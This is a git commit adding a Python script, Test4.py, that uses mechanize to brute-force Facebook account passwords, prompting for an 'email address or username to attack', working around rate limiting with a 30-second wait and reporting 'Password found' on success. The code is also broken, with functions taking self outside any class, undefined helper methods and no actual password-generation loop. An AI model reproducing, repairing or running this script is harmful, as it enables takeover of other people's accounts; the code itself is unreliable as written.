f83ccf5878e4793a285445676af4219651b667ff
krarktel112 <krarktel@gmail.com>
2024-08-15 14:22:05 -0400

    Create Test4.py

---
+++ Test4.py
@@ -0,0 +1,59 @@
+import itertools
+import sys
+from time import sleep
+
+import mechanize
+
+CHRS = '0123456789'
+
+MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
+              'AppleWebKit/534.7 (KHTML, like Gecko) ' \
+              'Chrome/7.0.517.41 Safari/534.7' 
+
+LOGIN_URL = 'https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1'
+
+def __init__(self):
+    self.browser = self.setup_browser()
+
+def setup_browser(self):
+    browser = mechanize.Browser()
+    browser.set_handle_robots(False)
+    cookies = mechanize.CookieJar()
+    browser.set_cookiejar(cookies)
+    browser.addheaders = [('User-agent', MOZILLA_UAS)]
+    browser.set_handle_refresh(False)
+    return browser
+
+def send_login(self, email, password):
+    self.browser.open(self.LOGIN_URL)
+    self.browser.select_form(nr=0)
+    self.browser.form['email'] = email
+    self.browser.form['pass'] = password
+    return self.browser.submit().read()
+
+def try_password(self, email, password):
+    print ('Trying %s' % password)
+    data = self.send_login(email, password)
+
+    if self.is_too_often(data):
+        print ('Facebook says we\'re trying too often. Waiting 30 seconds.')
+        sleep(30)
+        self.try_password(password)
+
+    if self.is_logged_in(data):
+        print ('Password found: %s' % password )
+        sys.exit()
+
+email = input('Email address or username to attack:')
+password = input('Password:')
+browser = mechanize.Browser()
+browser.set_handle_robots(False)
+cookies = mechanize.CookieJar()
+browser.set_cookiejar(cookies)
+browser.addheaders = [('User-agent', MOZILLA_UAS)]
+browser.set_handle_refresh(False)
+browser.open('https://mbasic.facebook.com/login.php?next=https%3A%2F%2Fmbasic.facebook.com%2Fhome.php%3Fref%3Ddbl&refsrc=deprecated&ref=dbl&_rdr')
+browser.select_form(nr=0)
+browser.form['email'] = email
+browser.form['pass'] = password 
+browser.submit()
